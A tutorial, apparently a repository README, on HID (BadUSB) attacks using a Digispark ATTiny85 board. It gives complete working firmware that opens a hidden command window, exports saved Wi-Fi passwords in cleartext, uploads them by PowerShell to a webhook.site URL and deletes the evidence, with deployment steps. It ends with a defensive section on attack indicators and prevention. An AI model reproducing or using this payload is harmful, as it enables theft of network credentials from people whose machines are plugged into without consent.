# USB Attack 

## üõ°Ô∏èOverview
- **1. Today we are going to program the digi spark board so that it can send WiFi passwords to the hacker**
- **2. The design and operation of this training is very simple in this area and has been passed for your testing and awareness**
- **3. These attacks are physical and can be very dangerous.**
- 
### üîç What is a HID attack?
**HID** attacks are usually carried out by small devices such as the **Digispark ATTiny85**. When connected to a computer, these devices present themselves as a keyboard or mouse and execute **predefined commands** without the user's permission. Examples of these attacks include:
- Running **malicious PowerShell commands**
- Stealing sensitive information (such as Wi-Fi passwords and browser information)
- Downloading and executing malware
- Changing system security settings

# Code
```cpp
#include "DigiKeyboard.h"
#define KEY_DOWN 0x51
#define KEY_ENTER 0x28
void setup() {
  
pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(200);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(700);
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_M); 
  for(int i =0; i < 110; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN); 
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); 
  DigiKeyboard.delay(700);
  DigiKeyboard.println("netsh wlan export profile key=clear"); 
  DigiKeyboard.delay(700);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  DigiKeyboard.delay(700);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/YourToken -Method POST -InFile Wi-Fi-PASS");
  DigiKeyboard.delay(700);
  DigiKeyboard.println("del Wi-* /s /f /q"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}

```
### Webhook
- **Go to the [Webhook](https://webhook.site/) and copy your url and paste it in line 33 of the yourtoken section of the code. Then upload the code to the board**

### Final
- **Connect the board to the system and be patient until the work is done and finally go to the webhook.**

## ‚ö†Ô∏è HID Attack Indicators
If a device has connected to your system without your knowledge and you're noticing unusual behavior, you might be under a HID attack. Some signs of this attack include:
- Sudden opening of CMD or PowerShell
- Unusual mouse movement or automatic text typing
- Creation of unknown files on the system
- Activation of suspicious internet connections
- 
---
## üõë Ways to prevent HID attacks
### 1. **Disable suspicious USB devices** üö´
You can disable the ability to accept new HID devices in Windows:
```powershell
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBHID /v Start /t REG_DWORD /d 4 /f
```
### 2. **Use security software** üõ°Ô∏è
Software such as **USBGuard** and **NoHID** can prevent HID devices from running automatically.
- **USBGuard (Linux only)**:
```bash
sudo apt install usbguard
```
- **NoHID for Windows**: You can use software such as **G Data USB Keyboard Guard**.

### 3. **Enable security settings in BIOS/UEFI** ‚öôÔ∏è
Many motherboards have the ability to **disable unnecessary USB ports**. By entering BIOS/UEFI settings, you can:
- **Disable unnecessary USB ports**.
- **Allow access only to known devices**.

### 4. **Use a Data-Only USB Adapter** üîå
There are special USB adapters that **only allow power transfer and block data transfer**.

### 5. **Monitor system logs** üìä
Using tools like **Event Viewer on Windows** and **dmesg on Linux**, you can find out what devices are connected to your system.
```powershell
Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }
```
